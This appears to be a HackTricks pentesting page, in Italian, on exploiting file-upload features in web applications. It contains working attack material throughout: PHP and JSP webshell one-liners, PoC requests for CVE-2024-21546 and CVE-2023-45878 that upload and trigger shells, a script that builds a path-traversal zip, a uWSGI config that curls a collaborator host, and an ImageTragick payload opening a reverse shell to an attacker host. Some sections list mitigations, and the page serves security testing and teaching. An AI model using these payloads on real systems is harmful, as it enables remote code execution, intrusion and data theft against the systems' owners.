# Upload di file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per l'upload di file

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. Se applicabile, **controlla** le **estensioni precedenti.** Testale anche usando qualche **lettera maiuscola**: _pHp, .pHP5, .PhAr ..._
2. _Verifica di **aggiungere un'estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** **precedentemente** menzionate_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **doubling** dell'**extension** o aggiungendo dati junk (**null** bytes) tra le estensioni. _Puoi anche usare le **estensioni** precedenti per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** ai controlli precedenti:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima** dell'estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi cosa con estensione** _**.php**_**, ma** non necessariamente terminante in .php** eseguirà codice):
- _ex: file.php.png_
7. Usare **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, verrà inserito un carattere due punti ":" dopo un'estensione proibita e prima di una permessa. Di conseguenza verrà creato sul server un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg”). Questo file potrebbe poi essere modificato usando altre tecniche come il suo short filename. Il pattern "**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern potrebbe essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a rompere i limiti del nome file. L'estensione valida viene troncata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handler rimuovono o normalizzano i caratteri punto finali dal filename salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, puoi bypassare la validazione delle estensioni:

- Usare un MIME immagine valido e l'header magic corretto (es., il PNG `\x89PNG\r\n\x1a\n`).
- Nominare il file caricato con un'estensione PHP seguita da un punto, es., `shell.php.`.
- Il server rimuove il punto finale e persiste `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

PoC minimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Quindi accedi al percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigazioni:
- Aggiornare unisharp/laravel-filemanager a ≥ 2.9.1.
- Imporre allowlists lato server rigorose e rieseguire la convalida del nome file memorizzato.
- Servire gli upload da percorsi non eseguibili.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks impostando il **value** dell'**header** **Content-Type** su: _image/png_ , _text/plain_, application/octet-stream
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check aggiungendo all'inizio del file i **bytes di una immagine reale** (confondere il comando _file_). Oppure introdurre la shell all'interno dei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` o puoi anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **viene applicata una compressione** alla tua immagine, per esempio usando librerie standard PHP come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviva alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche essere **ridimensionando** l'**image**, usando per esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviva alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviva alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Altri trucchi da provare

- Trovare una vulnerabilità per **rinominare** il file già caricato (per cambiare l'estensione).
- Trovare una vulnerabilità **Local File Inclusion** per eseguire il backdoor.
- **Possible Information disclosure**:
1. Carica **più volte** (e allo **stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **"." , "..", or "…" come nome**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/", il nome file "." creerà un file chiamato uploads” nella directory "/www/".
4. Carica un file che potrebbe non essere facilmente eliminabile come **"…:.jpg"** in **NTFS**. (Windows)
5. Carica un file in **Windows** con **caratteri non validi** come `|<>*?”` nel suo nome. (Windows)
6. Carica un file in **Windows** usando **nomi riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un file **.html** (meno sospetto) che **eseguirà codice** quando verrà accidentalmente aperto dalla vittima.

### Trucchi per estensioni speciali

Se stai provando a caricare file su un **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai provando a caricare file su un **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguendoli con php, o includendoli in uno script...).

L'estensione `.inc` è talvolta usata per file php che sono usati solo per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso **che questa estensione venga eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come mostrato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e attenditi la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate in server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI utilizzano una sintassi specifica per includere variabili "magiche", placeholder e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari schemes supportati in uWSGI, lo scheme "exec" è particolarmente potente, permettendo la lettura di dati dallo standard output di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando viene processato un file di configurazione `.ini`.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e parsata, il processo uWSGI deve essere riavviato (eventualmente dopo un crash o a causa di un Denial of Service) oppure il file deve essere impostato su auto-reload. La funzionalità auto-reload, se abilitata, ricarica il file a intervalli specificati quando vengono rilevate modifiche.

È fondamentale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente il campo di potenziale sfruttamento.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Endpoint non autenticato in Gibbon LMS consente arbitrary file write all'interno della web root, portando a pre-auth RCE tramite il drop di un file PHP. Versioni vulnerabili: fino e incluso 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name e decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Caricare una webshell minimale ed eseguire comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver separato tramite `;` e `,`, poi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare estensione/tipo.
- Il codice risultante viene eseguito come l'utente del servizio web (ad es., XAMPP Apache on Windows).

I riferimenti per questo bug includono l'advisory usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server sta usando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia presente in una whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questa verifica può essere bypassata.**\
La **massima** lunghezza di un **filename** in **linux** è **255**, tuttavia **wget** tronca i nomi dei file a **236** caratteri. Puoi **download a file called "A"*232+".php"+".gif"**, questo filename **bypasserà** il **check** (in questo esempio **".gif"** è una **valida** estensione) ma `wget` **rinominerà** il file in **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** che potresti prendere in considerazione per bypassare questo controllo è far sì che **l'HTTP server reindirizzi a un file diverso**, così l'URL iniziale salterà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

### Evasione della directory di upload tramite NTFS junctions (Windows)

(Per questo attacco avrai bisogno di accesso locale alla macchina Windows) Quando gli upload sono memorizzati in sottocartelle per utente su Windows (es. C:\Windows\Tasks\Uploads\<id>\) e controlli la creazione/cancellazione di quella sottocartella, puoi sostituirla con una directory junction che punti a una posizione sensibile (es. il webroot). I caricamenti successivi verranno scritti nel percorso di destinazione, permettendo l'esecuzione di codice se il target interpreta codice lato server.

Esempio di flusso per reindirizzare gli upload nella webroot di XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Note
- mklink /J crea una junction di directory NTFS (reparse point). L'account del web server deve seguire la junction e avere permesso di scrittura nella destinazione.
- Questo reindirizza scritture arbitrarie di file; se la destinazione esegue script (PHP/ASP), questo diventa RCE.
- Contromisure: non permettere che upload roots scrivibili siano controllabili dall'attaccante sotto C:\Windows\Tasks o simili; bloccare la creazione di junction; convalidare le estensioni lato server; memorizzare gli upload su un volume separato o con deny‑execute ACLs.

### Upload con body compresso GZIP + path traversal in destination param → JSP webshell RCE (Tomcat)

Alcuni upload/ingest handler scrivono il raw request body in un filesystem path costruito da query parameter controllati dall'utente. Se l'handler supporta anche Content-Encoding: gzip e non canonicalizza/valida il destination path, è possibile combinare directory traversal con un payload gzipped per scrivere byte arbitrari in una directory servita via web e ottenere RCE (es., depositare un JSP in Tomcat’s webapps).

Flusso generico di exploitation:
- Prepara il payload lato server (es., minimal JSP webshell) e comprimi i byte con gzip.
- Invia una POST in cui un path parameter (es., token) contiene traversal che esce dalla cartella prevista, e file indica il filename da persistere. Imposta Content-Type: application/octet-stream e Content-Encoding: gzip; il body è il payload compresso.
- Visita il file scritto per innescare l'esecuzione.

Richiesta illustrativa:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Quindi trigger:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Note
- I percorsi target variano in base all'installazione (es., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in alcuni stack). Qualsiasi cartella esposta sul web che esegua JSP funzionerà.
- Burp Suite’s Hackvertor extension può produrre un body gzip corretto dal tuo payload.
- Questo è un pattern puro pre-auth arbitrary file write → RCE; non si basa sul multipart parsing.

Mitigazioni
- Deriva le destinazioni di upload lato server; non fidarti mai dei frammenti di percorso provenienti dai client.
- Canonicalizza e applica che il percorso risolto rimanga all'interno di una directory base allow-listed.
- Memorizza gli upload su un volume non eseguibile e nega l'esecuzione di script da percorsi scrivibili.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel testare i meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle applicazioni web.

### Corrupting upload indices with snprintf quirks (historical)

Alcuni handler di upload legacy che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di incoerenze e troncamento nel comportamento di `snprintf()`, un singolo upload costruito con cura può apparire come più file indicizzati lato server, confondendo la logica che presuppone una forma rigorosa (es., trattarlo come un upload multi-file e prendere branch non sicuri). Pur essendo di nicchia oggi, questo pattern di “corruzione degli indici” riemerge occasionalmente in CTF e in codebase più vecchie.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova ad ottenere una **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere un **XSS**
- Imposta **filename** su `; sleep 10;` per testare alcune command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **diversi svg payload** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi **indicare al web server di prendere un'immagine da un URL** potresti provare ad abusare di un [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **saved** in qualche sito **public**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: La [pagina seguente mostra come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che eseguirà JS arbitrario seguendo le indicazioni fornite.
- Carica il contenuto \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) per verificare se il server ha un **antivirus**
- Verifica se esiste un **limite di dimensione** quando si uploadano file

Ecco una top 10 di cose che puoi ottenere caricando (da [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulta [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Zip/Tar File Automatically decompressed Upload

Se puoi uploadare uno ZIP che verrà decompresso sul server, puoi fare 2 cose:

### Symlink

Carica un archivio che contiene soft link verso altri file, poi, accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inattesa di file in directory durante la decompressione è un problema significativo. Nonostante le ipotesi iniziali che questa configurazione potesse proteggere da OS-level command execution tramite upload di file malevoli, il supporto alla compressione gerarchica e le capacità di directory traversal del formato ZIP possono essere sfruttati. Questo permette agli attackers di bypassare le restrizioni e uscire dalle directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione target.

Un exploit automatico per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utility può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, l'**symlink trick with evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, dovresti creare un symlink a quel file nel tuo sistema. Questo assicura che evilarc non riscontri errori durante la sua esecuzione.

Di seguito è riportato un esempio di Python code usato per creare un malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abuso della compressione per file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Viene scritto codice PHP che esegue comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un editor esadecimale, sostituendo "xxA" con "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dall'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

Incorporare una PHP shell nell'IDAT chunk di un file PNG può bypassare efficacemente alcune operazioni di image processing. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, poiché vengono comunemente usate per ridimensionare e risamplare le immagini. La capacità della PHP shell incorporata di rimanere intatta dopo queste operazioni è un vantaggio significativo in alcuni scenari.

Una esplorazione dettagliata di questa tecnica, inclusa la metodologia e le possibili applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

Maggiori informazioni su: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files agiscono come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come RAR archive. Questi file non sono limitati a questa combinazione; sono possibili anche accoppiamenti come GIF e JS o PPT e JS.

L'utilità principale dei polyglot files risiede nella loro capacità di aggirare misure di sicurezza che filtrano i file in base al tipo. Una pratica comune in molte applicazioni è permettere solo alcuni tipi di file in upload — come JPEG, GIF o DOC — per mitigare il rischio derivante da formati potenzialmente pericolosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può eludere discretamente tali restrizioni.

Nonostante la loro adattabilità, i polyglots incontrano dei limiti. Per esempio, anche se un polyglot potrebbe incarnare contemporaneamente un PHAR file (PHp ARchive) e un JPEG, il successo dell'upload può dipendere dalle politiche sulle estensioni del sistema. Se la piattaforma è severa riguardo le estensioni consentite, la sola dualità strutturale del polyglot potrebbe non essere sufficiente per garantire l'upload.

Maggiori informazioni su: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Come evitare il rilevamento del tipo di file caricando un file JSON valido anche se non permesso simulando un PDF (tecniche descritte in **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Inserire un finto formato PDF all'interno di un campo del JSON in modo che la library pensi sia un pdf (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Basta creare un JSON più grande di quello in modo che non possa analizzare il contenuto come JSON e poi inserire dentro il JSON la parte iniziale di un PDF reale e verrà riconosciuto come PDF

## Riferimenti

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

